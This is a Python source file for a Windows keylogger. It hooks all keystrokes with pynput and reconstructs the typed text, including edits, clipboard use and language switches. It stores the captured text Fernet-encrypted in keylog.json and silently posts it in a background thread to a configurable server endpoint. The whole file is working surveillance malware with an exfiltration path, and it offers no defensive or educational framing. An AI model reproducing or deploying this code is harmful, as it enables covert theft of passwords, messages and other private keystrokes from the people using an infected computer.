import os
import json
import time
import ctypes
import locale
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import scrolledtext
import requests

def get_current_language():
    layout = ctypes.windll.user32.GetKeyboardLayout(0)
    lang_id = layout & 0xFFFF
    try:
        return locale.windows_locale[lang_id]
    except KeyError:
        raise KeyError(f"Unknown language ID: 0x{lang_id:X}")

class Encryptor:
    def __init__(self, key_file="key.key"):
        if os.path.exists(key_file):
            try:
                with open(key_file, "rb") as f:
                    self.key = f.read()
            except Exception as e:
                raise IOError(f"Failed to read key file '{key_file}': {e}")
        else:
            try:
                self.key = Fernet.generate_key()
                with open(key_file, "wb") as f:
                    f.write(self.key)
            except Exception as e:
                raise IOError(f"Failed to generate or write key file '{key_file}': {e}")
        self.cipher = Fernet(self.key)

    def encrypt(self, data):
        try:
            return self.cipher.encrypt(data)
        except Exception as e:
            raise ValueError(f"Encryption error: {e}")

    def decrypt(self, data):
        try:
            return self.cipher.decrypt(data)
        except Exception as e:
            raise ValueError(f"Decryption error: {e}")

class EncryptedFileWriter:
    def __init__(self, encryptor, log_file="keylog.json"):
        self.encryptor = encryptor
        self.log_file = log_file

    def load_logs(self):
        if not os.path.exists(self.log_file):
            return {}
        try:
            with open(self.log_file, "rb") as f:
                ed = f.read()
                dd = self.encryptor.decrypt(ed).decode("utf-8")
                return json.loads(dd)
        except Exception as e:
            raise RuntimeError(f"Error loading logs from '{self.log_file}': {e}")

    def save_logs(self, logs):
        try:
            with open(self.log_file, "wb") as f:
                jd = json.dumps(logs, ensure_ascii=False).encode("utf-8")
                ed = self.encryptor.encrypt(jd)
                f.write(ed)
        except Exception as e:
            raise RuntimeError(f"Error saving logs to '{self.log_file}': {e}")

class NetworkWriter:
    def __init__(self, encryptor, server_url="http://localhost:5000/logs"):
        self.encryptor = encryptor
        self.server_url = server_url

    def send_logs(self, logs):
        try:
            jd = json.dumps(logs, ensure_ascii=False).encode("utf-8")
            ed = self.encryptor.encrypt(jd)
            response = requests.post(self.server_url, data=ed, timeout=1)
            if response.status_code != 200:
                pass
        except Exception:
            pass

class MultiWriter:
    def __init__(self, writers):
        self.writers = writers

    def load_logs(self):
        for w in self.writers:
            if hasattr(w, "load_logs"):
                try:
                    return w.load_logs()
                except Exception:
                    pass
        return {}

    def save_logs(self, logs):
        for w in self.writers:
            if hasattr(w, "save_logs"):
                try:
                    w.save_logs(logs)
                except Exception:
                    pass

    def send_logs(self, logs):
        for w in self.writers:
            if hasattr(w, "send_logs"):
                try:
                    w.send_logs(logs)
                except Exception:
                    pass

class KeyLoggerManager:
    def __init__(self, writer, save_trigger_count=50):
        self.writer = writer
        self.logs = writer.load_logs() if hasattr(writer, "load_logs") else {}
        self.buffer = [""]
        self.row = 0
        self.col = 0
        self.last_minute = time.strftime("%d/%m/%Y %H:%M")
        self.keystroke_count = 0
        self.save_trigger_count = save_trigger_count
        self.current_language = get_current_language()
        self.selection_start = None
        self.selection_end = None
        self.clipboard = ""
        self.undo_stack = []
        self.redo_stack = []
        self._save_state_to_undo()

    def _save_state_to_undo(self):
        state = {
            "buffer": [line[:] for line in self.buffer],
            "row": self.row,
            "col": self.col,
            "selection_start": None if not self.selection_start else self.selection_start[:],
            "selection_end": None if not self.selection_end else self.selection_end[:],
        }
        self.undo_stack.append(state)

    def _restore_state(self, state):
        self.buffer = [line for line in state["buffer"]]
        self.row = state["row"]
        self.col = state["col"]
        self.selection_start = state["selection_start"]
        self.selection_end = state["selection_end"]

    def _clear_redo(self):
        self.redo_stack.clear()

    def _update_selection(self, keep_start=False):
        if keep_start:
            if not self.selection_start:
                self.selection_start = [self.row, self.col]
            self.selection_end = [self.row, self.col]
        else:
            self.selection_start = None
            self.selection_end = None

    def _has_selection(self):
        return self.selection_start and self.selection_end

    def _normalize_selection(self):
        if not self._has_selection():
            return None
        (r1, c1) = self.selection_start
        (r2, c2) = self.selection_end
        if (r2 < r1) or (r2 == r1 and c2 < c1):
            return (r2, c2, r1, c1)
        return (r1, c1, r2, c2)

    def _get_selected_text(self):
        rng = self._normalize_selection()
        if not rng:
            return ""
        (sr, sc, er, ec) = rng
        if sr == er:
            return self.buffer[sr][sc:ec]
        lines = [self.buffer[sr][sc:]]
        for r in range(sr + 1, er):
            lines.append(self.buffer[r])
        lines.append(self.buffer[er][:ec])
        return "\n".join(lines)

    def _handle_selection_delete(self):
        rng = self._normalize_selection()
        if not rng:
            return
        (sr, sc, er, ec) = rng
        if sr == er:
            line = self.buffer[sr]
            self.buffer[sr] = line[:sc] + line[ec:]
            self.row, self.col = sr, sc
        else:
            top_line = self.buffer[sr][:sc]
            bottom_line = self.buffer[er][ec:]
            del self.buffer[sr:er + 1]
            self.buffer.insert(sr, top_line + bottom_line)
            self.row, self.col = sr, sc
        self.selection_start = None
        self.selection_end = None

    def handle_key_press(self, key):
        current_minute = time.strftime("%d/%m/%Y %H:%M")
        if current_minute != self.last_minute:
            self._commit_current_text()
            self.last_minute = current_minute
        self.keystroke_count += 1
        self._process_key(key)
        if self.save_trigger_count > 0 and self.keystroke_count >= self.save_trigger_count:
            self.keystroke_count = 0
            self._commit_current_text()

    def _process_key(self, key):
        combo = KeyLoggerService.get_current_modifiers()
        shift_pressed = combo.get("shift", False)
        ctrl_pressed = combo.get("ctrl", False)
        if KeyLoggerService.is_language_switch_combo():
            old_lang = self.current_language
            new_lang = get_current_language()
            if new_lang != old_lang:
                self._insert_text(f"[Lang changed {old_lang} -> {new_lang}] ")
                self.current_language = new_lang
            return
        if ctrl_pressed:
            self._handle_ctrl_shortcuts(key)
            return
        if hasattr(key, "char") and key.char:
            if shift_pressed and not self._has_selection():
                self.selection_start = [self.row, self.col]
                self.selection_end = [self.row, self.col]
            self._insert_text(key.char, shift_pressed)
            return
        self._handle_special_keys(key, shift_pressed)

    def _handle_ctrl_shortcuts(self, key):
        if hasattr(key, "char"):
            c = key.char.lower()
            if c == 'c' and self._has_selection():
                self.clipboard = self._get_selected_text()
            elif c == 'x' and self._has_selection():
                self.clipboard = self._get_selected_text()
                self._save_state_to_undo()
                self._clear_redo()
                self._handle_selection_delete()
            elif c == 'v' and self.clipboard:
                self._save_state_to_undo()
                self._clear_redo()
                if self._has_selection():
                    self._handle_selection_delete()
                self._insert_text(self.clipboard)
            elif c == 'z':
                self._undo()
            elif c == 'y':
                self._redo()

    def _undo(self):
        if len(self.undo_stack) > 1:
            current = self.undo_stack.pop()
            self.redo_stack.append(current)
            prev = self.undo_stack[-1]
            self._restore_state(prev)

    def _redo(self):
        if self.redo_stack:
            state = self.redo_stack.pop()
            self._save_state_to_undo()
            self._restore_state(state)

    def _insert_text(self, text, shift_pressed=False):
        self._save_state_to_undo()
        self._clear_redo()
        if self._has_selection():
            self._handle_selection_delete()
        line = self.buffer[self.row]
        before = line[:self.col]
        after = line[self.col:]
        self.buffer[self.row] = before + text + after
        self.col += len(text)
        if shift_pressed:
            self._update_selection(keep_start=True)
        else:
            self._update_selection(keep_start=False)

    def _handle_special_keys(self, key, shift_pressed):
        if key == keyboard.Key.enter:
            command = self.buffer[self.row].strip().lower()
            if command == "show":
                self._commit_current_text()
                self.show_gui()
                self._reset_buffer()
            elif command == "exit":
                self.commit_logs()
                os._exit(0)
            else:
                self._save_state_to_undo()
                self._clear_redo()
                self._new_line(shift_pressed)
            return
        elif key == keyboard.Key.space:
            self._insert_text(" ", shift_pressed)
            return
        elif key == keyboard.Key.backspace:
            self._save_state_to_undo()
            self._clear_redo()
            if self._has_selection():
                self._handle_selection_delete()
            else:
                self._backspace()
            return
        elif key == keyboard.Key.delete:
            self._save_state_to_undo()
            self._clear_redo()
            if self._has_selection():
                self._handle_selection_delete()
            else:
                self._delete()
            return
        elif key == keyboard.Key.left:
            self._move_left(shift_pressed)
            return
        elif key == keyboard.Key.right:
            self._move_right(shift_pressed)
            return
        elif key == keyboard.Key.up:
            self._move_up(shift_pressed)
            return
        elif key == keyboard.Key.down:
            self._move_down(shift_pressed)
            return
        elif key == keyboard.Key.home:
            self._move_home(shift_pressed)
            return
        elif key == keyboard.Key.end:
            self._move_end(shift_pressed)
            return

    def _move_left(self, shift_pressed):
        if self.col > 0:
            self.col -= 1
        elif self.row > 0:
            self.row -= 1
            self.col = len(self.buffer[self.row])
        if shift_pressed:
            self._update_selection(keep_start=True)
        else:
            self._update_selection(False)

    def _move_right(self, shift_pressed):
        line_length = len(self.buffer[self.row])
        if self.col < line_length:
            self.col += 1
        elif self.row < len(self.buffer) - 1:
            self.row += 1
            self.col = 0
        if shift_pressed:
            self._update_selection(keep_start=True)
        else:
            self._update_selection(False)

    def _move_up(self, shift_pressed):
        if self.row > 0:
            self.row -= 1
            self.col = min(self.col, len(self.buffer[self.row]))
        if shift_pressed:
            self._update_selection(keep_start=True)
        else:
            self._update_selection(False)

    def _move_down(self, shift_pressed):
        if self.row < len(self.buffer) - 1:
            self.row += 1
            self.col = min(self.col, len(self.buffer[self.row]))
        if shift_pressed:
            self._update_selection(keep_start=True)
        else:
            self._update_selection(False)

    def _move_home(self, shift_pressed):
        self.col = 0
        if shift_pressed:
            self._update_selection(True)
        else:
            self._update_selection(False)

    def _move_end(self, shift_pressed):
        self.col = len(self.buffer[self.row])
        if shift_pressed:
            self._update_selection(True)
        else:
            self._update_selection(False)

    def _new_line(self, shift_pressed=False):
        line = self.buffer[self.row]
        before = line[:self.col]
        after = line[self.col:]
        self.buffer[self.row] = before
        self.buffer.insert(self.row + 1, after)
        self.row += 1
        self.col = 0
        if shift_pressed:
            self._update_selection(True)
        else:
            self._update_selection(False)

    def _backspace(self):
        if self.col > 0:
            line = self.buffer[self.row]
            before = line[:self.col - 1]
            after = line[self.col:]
            self.buffer[self.row] = before + after
            self.col -= 1
        elif self.row > 0:
            prev_line_len = len(self.buffer[self.row - 1])
            self.buffer[self.row - 1] += self.buffer[self.row]
            self.buffer.pop(self.row)
            self.row -= 1
            self.col = prev_line_len

    def _delete(self):
        line = self.buffer[self.row]
        if self.col < len(line):
            before = line[:self.col]
            after = line[self.col + 1:]
            self.buffer[self.row] = before + after
        elif self.row < len(self.buffer) - 1:
            self.buffer[self.row] += self.buffer[self.row + 1]
            self.buffer.pop(self.row + 1)

    def _commit_current_text(self):
        text_snapshot = " ".join(line.strip() for line in self.buffer)
        if text_snapshot.strip():
            if self.last_minute not in self.logs:
                self.logs[self.last_minute] = []
            self.logs[self.last_minute].append(text_snapshot)
            self.commit_logs()
        self._reset_buffer()

    def _reset_buffer(self):
        self.buffer = [""]
        self.row = 0
        self.col = 0
        self.selection_start = None
        self.selection_end = None

    def commit_logs(self):
        if hasattr(self.writer, "save_logs"):
            self.writer.save_logs(self.logs)
        if hasattr(self.writer, "send_logs"):
            t = threading.Thread(target=self.writer.send_logs, args=(self.logs,))
            t.daemon = True
            t.start()

    def read_logs(self):
        d = {}
        if hasattr(self.writer, "load_logs"):
            d = self.writer.load_logs()
        if d:
            return json.dumps(d, indent=4, ensure_ascii=False)
        return "No logs available."

    def show_gui(self):
        logs_text = self.read_logs()
        if logs_text == "No logs available.":
            return
        root = tk.Tk()
        root.withdraw()
        window = tk.Toplevel(root)
        window.title("Keylogger Logs")
        ta = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=60, height=20)
        ta.insert(tk.INSERT, logs_text)
        ta.configure(state="disabled")
        ta.pack(padx=10, pady=10)
        tk.Button(window, text="Close", command=window.destroy).pack(pady=5)
        window.protocol("WM_DELETE_WINDOW", window.destroy)
        window.wait_window()
        root.destroy()

class KeyLoggerService:
    pressed_keys = set()

    @staticmethod
    def get_current_modifiers():
        return {
            "shift": any(k in KeyLoggerService.pressed_keys for k in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]),
            "ctrl": any(k in KeyLoggerService.pressed_keys for k in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]),
            "alt": any(k in KeyLoggerService.pressed_keys for k in [keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r]),
            "win": any(k in KeyLoggerService.pressed_keys for k in [keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r]),
        }

    @staticmethod
    def is_language_switch_combo():
        combo = KeyLoggerService.get_current_modifiers()
        alt_shift = combo["alt"] and combo["shift"]
        ctrl_shift = combo["ctrl"] and combo["shift"]
        win_space = combo["win"] and (keyboard.Key.space in KeyLoggerService.pressed_keys)
        return alt_shift or ctrl_shift or win_space

    def __init__(self, manager):
        self.manager = manager

    def on_press(self, key):
        KeyLoggerService.pressed_keys.add(key)
        self.manager.handle_key_press(key)

    def on_release(self, key):
        if key in KeyLoggerService.pressed_keys:
            KeyLoggerService.pressed_keys.remove(key)

if __name__ == "__main__":
    try:
        encryptor = Encryptor("key.key")
        file_writer = EncryptedFileWriter(encryptor, "keylog.json")
        network_writer = NetworkWriter(encryptor, "http://localhost:5000/logs")
        multi_writer = MultiWriter([file_writer, network_writer])
        manager = KeyLoggerManager(multi_writer, save_trigger_count=50)
        service = KeyLoggerService(manager)
        with keyboard.Listener(on_press=service.on_press, on_release=service.on_release) as listener:
            listener.join()
    except Exception as e:
        raise e